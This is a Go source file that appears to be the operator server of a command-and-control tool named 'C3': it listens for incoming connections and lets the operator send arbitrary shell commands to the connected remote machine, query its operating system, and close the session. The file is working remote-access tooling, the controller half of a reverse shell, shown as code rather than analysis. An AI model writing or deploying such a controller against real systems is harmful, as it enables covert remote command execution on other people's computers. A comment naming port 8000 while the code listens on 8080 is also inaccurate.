package main

import (
	// Standard
	"bufio"
	"fmt"
	"encoding/gob"
	"net"
	"os"
	"strings"

	// C3
	"github.com/calebmatsick/C3/pkg/color"
)


func shell(conn net.Conn) {
	enc := gob.NewEncoder(conn)
	dec := gob.NewDecoder(conn)

	shellLoop:for {
		fmt.Printf(color.Green + "[shell]: " + color.Reset)
		shellCmd, _ := bufio.NewReader(os.Stdin).ReadString('\n')
		shellCmd = strings.TrimSuffix(shellCmd, "\n")

		switch {
		case shellCmd == "":
			continue
		case shellCmd == "close":
			enc.Encode(shellCmd)
			break shellLoop
		default:
			result := ""
			enc.Encode(shellCmd)
			dec.Decode(&result)
			result = strings.TrimSuffix(result, "\n")
			fmt.Println(string(result))
		}
	}
}


func sysinfo(conn net.Conn) {
	enc := gob.NewEncoder(conn)
	dec := gob.NewDecoder(conn)

	enc.Encode("sysinfo")

	result := ""
	dec.Decode(&result)

	switch {
	case result == "windows":
		fmt.Println("The system is running Windows")
	case result == "darwin":
		fmt.Println("The system is running MacOS")
	case result == "linux":
		fmt.Println("The system is running Linux")	
	}
}


func exit(conn net.Conn) {
	enc := gob.NewEncoder(conn)
	enc.Encode("exit")
	conn.Close()
}


func handleConnection(conn net.Conn) {
	connLoop:for {
		fmt.Printf(color.Blue + "[C3]: " + color.Reset)
		c3cmd, _ := bufio.NewReader(os.Stdin).ReadString('\n')
		c3cmd = strings.TrimSuffix(c3cmd, "\n")

		switch {
		case c3cmd == "":
			continue connLoop
		case c3cmd == "exit":
			exit(conn)
			break connLoop
		case c3cmd == "shell":
			shell(conn)
		case c3cmd == "sysinfo":
			sysinfo(conn)
		default:
			fmt.Println(color.Red + "[ERROR]: " + color.Reset + "Invalid command")
		}
	}

}


func main() {
	fmt.Println("Start server")

	// Listen on port 8000
	ln, err := net.Listen("tcp", ":8080")

	if err != nil {
		fmt.Println(color.Red + "[ERROR]: " + color.Reset + "Cannot listen on given port")
	}

	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println(color.Red + "[ERROR]: " + color.Reset + "Cannot accept connection")
		}
		go handleConnection(conn)
	}
}